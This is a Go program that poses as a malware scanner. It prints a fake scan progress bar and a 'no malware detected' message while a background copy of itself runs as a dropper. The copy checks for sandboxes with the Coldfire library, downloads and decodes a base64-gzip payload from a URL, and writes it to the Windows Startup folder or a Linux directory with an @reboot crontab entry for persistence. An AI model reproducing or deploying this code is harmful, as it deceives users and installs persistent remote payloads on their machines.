package main

import (
	"compress/gzip"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	coldfire "github.com/redcode-labs/Coldfire"
)

var url = ""

func main() {
	if len(os.Args) == 2 && os.Args[1] == "1" {
		stage()
		drop()
		return
	}

	go run_dropper()

	fmt.Println("Beginning malware scan, please wait")
	fmt.Print("Progress: ")
	for range 10 {
		fmt.Print("=")
		time.Sleep(time.Second * time.Duration(rand.IntN(5)))
	}
	fmt.Println("Finished!")
	fmt.Println("No malware detected, keep it that way ;)")
}

func drop() {
	resp, err := http.Get(url)
	if err != nil {
		return
	}

	gz, err := gzip.NewReader(base64.NewDecoder(base64.StdEncoding, resp.Body))
	if err != nil {
		return
	}
	data, err := io.ReadAll(gz)
	if err != nil {
		return
	}

	user, err := user.Current()
	if err != nil {
		return
	}
	hostname, err := os.Hostname()
	if err != nil {
		return
	}

	hasher := sha256.New()
	hasher.Write([]byte(user.Username))
	hasher.Write([]byte(hostname))
	filename := string(hasher.Sum([]byte{}))

	if runtime.GOOS == "windows" {
		dir, err := os.UserConfigDir()
		if err != nil {
			return
		}
		dir = filepath.Join(dir, "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if os.Chdir(dir) != nil {
			return
		}
	} else {
		dir, _ := os.UserHomeDir()
		dir = filepath.Join(dir, ".local/share/applications")

		if err := os.MkdirAll(dir, 0755); err != nil && !os.IsExist(err) {
			os.WriteFile(filepath.Join(dir, "test.txt"), []byte(err.Error()), 0755)
			return
		}
		if os.Chdir(dir) != nil {
			return
		}

		cmd := fmt.Sprintf("bash -c \"(crontab -l; echo \"@reboot %s\" ) | crontab -\"", filepath.Join(dir, filename))
		exec.Command("/bin/sh", "-c", cmd).Start()
	}
	os.WriteFile(filename, data, 0777)
}

func stage() {
	if coldfire.SandboxAll() {
		os.Exit(0)
	}
}

func run_dropper() {
	bin, err := os.Executable()
	if err != nil {
		return
	}
	exec.Command(bin, "1").Start()
}
